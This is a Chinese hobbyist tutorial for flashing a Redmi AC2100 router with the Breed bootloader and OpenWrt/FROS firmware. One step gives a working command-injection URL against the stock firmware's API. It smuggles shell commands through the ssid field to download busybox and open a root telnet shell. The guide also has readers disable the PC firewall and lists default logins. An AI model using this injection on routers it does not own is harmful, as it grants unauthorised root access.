# **红米`AC2100`刷机教程**

<img src=".images\红米AC2100刷机流程-breed\image1.png" title="" alt="" data-align="center">

### 产品介绍

红米`AC2100`是一款双频`wifi`路由器，支持`2.4G`和`5G``wifi`，

支持刷机，是一款性价比比较强的路由器。

若是刷机新手，推荐用这款路由器刷机。

### 为什么刷机

刷机后可以使用更多家用路由器没有的功能，

主流的系统就是`OpenWrt/Lede`、老毛子、梅林等。

### 刷机原理

刷机就是替换原厂的固件，刷机包括刷`boot`和刷系统，`boot`类似于`pc`的`bios`，

用于引导系统，通常需要刷入不死`uboot`，防止路由器变砖。

刷机的难点在于解锁原厂固件的后台，解锁后就可以随便刷机了。

### **免责声明**

由于每个人的技术水平不一样，

刷机过程中可能有误操作或者其他外部因素影响导致路由器不能用，

刷机有风险，

请考虑好后再刷机，

刷机引起的一些问题与本教程作者无关。

## 红米`AC2100`刷机主要步骤概览:

1. 关闭防火墙，开启`telnet`客户端

2. 进入原厂系统后台，恢复到旧版本固件

3. 开启`telnet`服务

4. 升级`boot`(`breed`)

5. `breed`下升级中间固件(只读文件系统)

6. 升级固件

## **刷机详细流程**

### 关闭防火墙

电脑右键属性 -> 控制面板主页 -> Windows Defender 防火墙 -> 

启用或关闭 Windows Defender 防火墙 -> 选择关闭防火墙

> 两个都关了

<img src=".images\红米AC2100刷机流程-breed\image2.png" title="" alt="" data-align="center"><img src=".images\红米AC2100刷机流程-breed\image2.png" title="" alt="" data-align="center">

### 开启`windows telnet`客户端功能

<img src=".images\红米AC2100刷机流程-breed\image3.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image4.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image5.png" title="" alt="" data-align="center">

### 升级旧版固件

进入管理界面，选择刷机包中的固件（新版本可能修复了漏洞）

```shell
miwifi_rm2100_firmware_d6234_2.0.7.bin
```

<img src=".images\红米AC2100刷机流程-breed\image6.png" title="" alt="" data-align="center">

<img title="" src=".images\红米AC2100刷机流程-breed\image7.jpeg" alt="" data-align="center">

### 升级成功后登陆管理界面获取`stok`

复制地址栏中的`stok` （下图红色框框中的内容，每次登陆不一样）

<img title="" src=".images\红米AC2100刷机流程-breed\image8.jpeg" alt="" data-align="center">

### 制作`telnet`一键开启链接

- 将上一步复制的`stok`内容替换下图中的`stok`内容，如下图：

<img title="" src=".images\红米AC2100刷机流程-breed\image9.jpeg" alt="" data-align="center">

- 修改链接中的`ip`地址为电脑网卡的地址

<img src=".images\红米AC2100刷机流程-breed\image10.png" title="" alt="" data-align="center">

<img title="" src=".images\红米AC2100刷机流程-breed\image11.jpeg" alt="" data-align="center">

具体如下：

```shell
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Acd%20%2Ftmp%0Atftp%20-gr%20busybox%20<IP>%0Achmod%20777%20busybox%0A.%2Fbusybox%20telnetd%20-l%20%2Fbin%2Fsh%20%26%0A
```

5\. 开启`tftp`服务器

<img title="" src=".images\红米AC2100刷机流程-breed\image12.jpeg" alt="" data-align="center">

5\. 复制上文所修改的网址
文件中新的链接，粘贴到浏览器地址栏，按回车访问

<img title="" src=".images\红米AC2100刷机流程-breed\image13.jpeg" alt="" data-align="center">

6\. 打开`windows cmd`命令

输入`telnet 192.168.31.1`进入路由器后台

<img src=".images\红米AC2100刷机流程-breed\image14.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image15.png" title="" alt="" data-align="center">

### 检测闪存类型和坏块

1. 检测闪存内存是否是东芝

```shell
dmesg \| grep Toshiba
```

若以上命令有输出表示是东芝闪存，可能存在坏块，需要执行步骤2操作

1. 检测坏块

```shell
dmesg \|grep Bad
```

若有输出表示存在坏块，后续升级文件较大的固件可能存在问题。

不过一般固件也不会太大，可以先升级`boot`(`breed`)，

按照步骤操作看能不能成功，

不行可以通过`breed`恢复官方`boot`之后还原官方系统。

> **备注：**
> 
> 作者发布的固件比较小（小于20M），
> 
> 有坏块的设备也都是直接刷，
> 
> 目前没有出现过变砖的问题，
> 
> 只要`breed`刷成功，
> 
> 即使系统挂掉也不用担心变砖。

### 运行刷机命令

一次复制一行，粘贴在命令行终端中运行（前面两条命令会比较慢，耐心等待）

注意需要将`ip(192.168.31.99)`修改为自己电脑网卡的`ip`地址

```shell
tftp -gr breed-mt7621-xiaomi-r3g.bin 192.168.31.99
```

可以观察`tftp`服务器有没有文件传输响应，

若没有请检查防火墙和`tftp`服务器是否正常开启，

确认好后再执行下面的刷机命令。

注意红米`AC2100`是共用`r3g`的`breed`，名称是`r3g`的。

```shell
mtd write breed-mt7621-xiaomi-r3g.bin Bootloader
```

<img src=".images\红米AC2100刷机流程-breed\image16.png" title="" alt="" data-align="center">

**注意一定要是以上输出，否则没成功。**

成功后拔掉电源

长按住`reset`键，不要松，之后接入电源，大概`10s`左右后松开`reset`键，
注意要橙色灯快速闪烁。

> 这一步类似`PC`进入`BIOS`模式

通过浏览器访问`192.168.1.1`，进入`breed boot`界面

<img src=".images\红米AC2100刷机流程-breed\image17.png" title="" alt="" data-align="center">

进入了`breed`就可以随便更换系统了

在更换之前可以先备份下系统相关信息特别是`eeprom`，在**固件备份**中可以备份

由于`breed`默认不能启动`openwrt`固件，需要设置一个环境变量

环境变量：

`xiaomi.r3g.bootfw` 设置为`2`

如下图所示：

<img src=".images\红米AC2100刷机流程-breed\image18.png" title="" alt="" data-align="center">

设置好环境变量后点击固件更新

选择`initramfs-kernel`固件，之后升级，等待系统起来

> **备注：**
> 
> 带 `initramfs-kernel` 字样的固件表示文件系统只读，
> 
> 在`breed`下只能先升级该文件才能成功，
> 
> 当升级成功后进入系统界面再次升级`sysupgrade`固件。

<img src=".images\红米AC2100刷机流程-breed\image19.png" title="" alt="" data-align="center">

系统启动成功后通过浏览器访问`192.168.66.1`进入登录界面（默认界面为FROS界面），也可以右上角进入原生`openwrt`界面。

> 登录信息
> 
> 用户名： `admin` 
> 
> 密码: `admin`

<img src=".images\红米AC2100刷机流程-breed\image20.png" title="" alt="" data-align="center">

> `Openwrt`登录信息:
> 
> 用户名: `root` 
> 
> 密码: `password`

<img src=".images\红米AC2100刷机流程-breed\image21.png" title="" alt="" data-align="center">

升级最终固件

`OpenWrt`固件列表中的sysupgrade固件为升级固件，必须要升级该固件才能用，可以进入`openwrt`原生界面选择固件升级。

```shell
openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-sysupgrade-fros2.0.2.bin
```

<img src=".images\红米AC2100刷机流程-breed\image22.png" title="" alt="" data-align="center">

也可以进入`fros`界面选择固件升级

```shell
openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-sysupgrade-fros2.0.2.bin
```

注意只要是固件名带有
“`redmi-router-ac2100-squashfs-sysupgrade`”就是红米`AC2100`的`web`升级固件，

根据自己需要升级的版本进行选择即可，

若出现格式错误之类的，那应该是当前固件和升级固件版本不兼容，

可以先通过`breed`升级同版本的`kernel`固件，之后再升级。

<img src=".images\红米AC2100刷机流程-breed\image23.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image24.png" title="" alt="" data-align="center">

升级后系统会自动重启，升级完成

<img src=".images\红米AC2100刷机流程-breed\image25.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image26.png" title="" alt="" data-align="center">

<img src=".images\红米AC2100刷机流程-breed\image27.png" title="" alt="" data-align="center">

------

原文地址：[https://mp.weixin.qq.com/s/ys_L23U7rh2XlhF4My0ZMA](https://mp.weixin.qq.com/s/ys_L23U7rh2XlhF4My0ZMA)
